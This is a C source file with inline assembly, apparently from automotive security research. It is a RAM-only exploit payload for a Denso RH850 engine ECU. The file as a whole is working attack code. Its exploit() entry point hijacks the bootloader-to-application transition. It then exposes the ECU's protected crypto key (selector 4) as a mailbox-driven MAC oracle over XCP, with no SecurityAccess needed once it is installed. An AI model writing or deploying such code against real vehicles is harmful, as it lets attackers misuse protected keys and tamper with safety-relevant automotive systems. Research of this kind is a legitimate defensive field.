/*
 * RAM-only ICU-S command-5 proxy for Denso RH850/P1M-E 8965B4512000.
 *
 * This uses the same verified boot -> application context -> stock-startup
 * transition as the inert scheduler canary.  Once the stock application and
 * ICU-S/CryptoIf state are initialized, a small XCP-visible mailbox drives the
 * existing serialized command-5 dispatcher with driver record 0 and protected
 * key selector 4.  No CodeFlash mutation or application SecurityAccess is
 * required after the RAM runtime has been installed.
 *
 * Important boundary: installing this runtime still relies on the separately
 * recovered bootloader authenticated-RAM foothold.  This source does not bypass
 * that initial authentication and does not claim live slot-4 command-5 policy.
 */

typedef void (*fn0_t)(void);
typedef void (*fn1_t)(unsigned int);
typedef int (*cmd5_dispatch_t)(unsigned short, void *, void *, unsigned int,
                               void *, unsigned int *, unsigned char);

#include "target_config.h"

#define STR_INNER(x) #x
#define STR(x) STR_INNER(x)

#define COMMAND5_MAILBOX_MAGIC 0x35444D43u /* little-endian bytes: "CMD5" */
#define COMMAND5_MAX_INPUT     80u
#define COMMAND5_MAX_OUTPUT    16u
#define COMMAND5_STATE_IDLE    0u
#define COMMAND5_STATE_PENDING 1u
#define COMMAND5_ERROR_LENGTH  0x100u

struct command5_mailbox {
  volatile unsigned int magic;          /* +0x00 */
  volatile unsigned int request_seq;    /* +0x04; tester commits this last */
  volatile unsigned int response_seq;   /* +0x08; runtime publishes this last */
  volatile unsigned int state;          /* +0x0C */
  volatile unsigned int length;         /* +0x10 */
  volatile unsigned int output_length;  /* +0x14 */
  volatile unsigned int driver_status;  /* +0x18 */
  volatile unsigned int reserved;       /* +0x1C */
  volatile unsigned char input[80];      /* +0x20 */
  volatile unsigned char output[16];     /* +0x70 */
};

typedef char command5_mailbox_must_be_128_bytes[
    sizeof(struct command5_mailbox) == 0x80u ? 1 : -1];

static void post_context_startup(void) __attribute__((noreturn, noinline));

/*
 * Entry begins in bootloader context.  TARGET_APP_CPU_CONTEXT_INIT changes
 * GP/TP/SP, so do not touch the old C frame after it returns.
 */
void __attribute__((noreturn)) exploit(void) {
  __asm__ volatile (
    "mov " STR(TARGET_BOOT_INIT_0) ", r12\n\tjarl [r12], lp\n\t"
    "mov " STR(TARGET_BOOT_INIT_1) ", r12\n\tjarl [r12], lp\n\t"
    "mov " STR(TARGET_BOOT_INIT_2) ", r12\n\tjarl [r12], lp\n\t"
    "mov " STR(TARGET_BOOT_INIT_3) ", r12\n\tjarl [r12], lp\n\t"
    "mov " STR(TARGET_BOOT_VALIDITY_CHECK) ", r12\n\tjarl [r12], lp\n\t"
    "cmp r0, r10\n\tbne 1f\n\t"
    "mov " STR(TARGET_APP_CPU_CONTEXT_INIT) ", r12\n\tjarl [r12], lp\n\t"
    "jr _post_context_startup\n\t"
    "1: br 1b\n\t"
  );
  __builtin_unreachable();
}

static void call0(unsigned int address) __attribute__((noinline));
static void call0(unsigned int address) { ((fn0_t)address)(); }

static void post_context_startup(void) {
  struct command5_mailbox *mailbox =
      (struct command5_mailbox *)TARGET_COMMAND5_MAILBOX;
  unsigned int pending_seq = 0u;
  unsigned int pending = 0u;

  /* Execute the exact stock startup JARL table before using ICU-S. */
  for (unsigned int pc = TARGET_APP_STARTUP_FIRST_JARL;
       pc < TARGET_APP_STARTUP_AFTER_JARLS; pc += 4u) {
    unsigned int ins = *(volatile unsigned int *)pc;
    int signed_high6 = (int)(ins & 0x3Fu);
    signed_high6 = (signed_high6 ^ 0x20) - 0x20;
    call0(pc + ((unsigned int)(signed_high6 << 16) | (ins >> 16)));
  }
  ((fn1_t)TARGET_APP_STARTUP_FINAL_INIT)(0u);
  __asm__ volatile("ei");

  /* Ignore any stale/preloaded request across the application transition. */
  mailbox->magic = COMMAND5_MAILBOX_MAGIC;
  mailbox->state = COMMAND5_STATE_IDLE;
  mailbox->driver_status = 0u;
  mailbox->output_length = 0u;
  mailbox->response_seq = mailbox->request_seq;

  for (;;) {
    unsigned int timing = 0u;

    __asm__ volatile(
      "1: tst1 " STR(TARGET_TICK_BIT) ", " STR(TARGET_TICK_DISPLACEMENT) "[r0]\n\t"
      "be 1b\n\t"
      "clr1 " STR(TARGET_TICK_BIT) ", " STR(TARGET_TICK_DISPLACEMENT) "[r0]");

    if (*(volatile unsigned char *)TARGET_FOREGROUND_TIMING_FLAG == 0x5Au) {
      call0(TARGET_FG_TIMING_BEGIN);
      timing = 1u;
    }
    call0(TARGET_FG_PRE_0);
    call0(TARGET_FG_PRE_1);
    call0(TARGET_FG_PRE_2);
    call0(TARGET_FG_PRE_3);
    call0(TARGET_FG_AGGREGATE);
    call0(TARGET_FG_POST_0);
    call0(TARGET_FG_POST_1);
    call0(TARGET_FG_POST_2);

    /*
     * Record 0 completion runs only after the stock result-copy worker has
     * copied the generated MAC to mailbox->output.  Publish response_seq last,
     * making it the tester-visible completion commit.
     */
    if (pending != 0u) {
      if (*(volatile unsigned char *)TARGET_COMMAND5_DONE_FLAG == 1u) {
        mailbox->driver_status =
            *(volatile unsigned char *)TARGET_COMMAND5_STATUS_FLAG;
        mailbox->state = COMMAND5_STATE_IDLE;
        pending = 0u;
        mailbox->response_seq = pending_seq;
      }
    } else if (mailbox->request_seq != mailbox->response_seq) {
      unsigned int length = mailbox->length;
      unsigned int config[2];
      int rc;

      if (length <= COMMAND5_MAX_INPUT) {
        config[0] = 1u;
        config[1] = TARGET_COMMAND5_KEY_SELECTOR;
        mailbox->output_length = COMMAND5_MAX_OUTPUT;

        /* Record-0 completion owns these two otherwise-private result bytes. */
        *(volatile unsigned char *)TARGET_COMMAND5_DONE_FLAG = 0u;
        *(volatile unsigned char *)TARGET_COMMAND5_STATUS_FLAG = 0xFFu;

        rc = ((cmd5_dispatch_t)TARGET_COMMAND5_DISPATCH)(
            TARGET_COMMAND5_DRIVER_RECORD, config, (void *)mailbox->input,
            length, (void *)mailbox->output,
            (unsigned int *)&mailbox->output_length, 1u);

        if (rc == 0) {
          pending_seq = mailbox->request_seq;
          mailbox->state = COMMAND5_STATE_PENDING;
          pending = 1u;
        } else if (rc != 2) {
          /* rc==2 is shared-driver busy: leave the request uncommitted and retry. */
          mailbox->driver_status = (unsigned int)rc;
          mailbox->state = COMMAND5_STATE_IDLE;
          mailbox->response_seq = mailbox->request_seq;
        }
      } else {
        mailbox->driver_status = COMMAND5_ERROR_LENGTH;
        mailbox->output_length = 0u;
        mailbox->state = COMMAND5_STATE_IDLE;
        mailbox->response_seq = mailbox->request_seq;
      }
    }

    if (timing != 0u) {
      call0(TARGET_FG_TIMING_END);
    }
    (*(volatile unsigned char *)TARGET_FOREGROUND_TICK_COUNTER)++;
  }
}
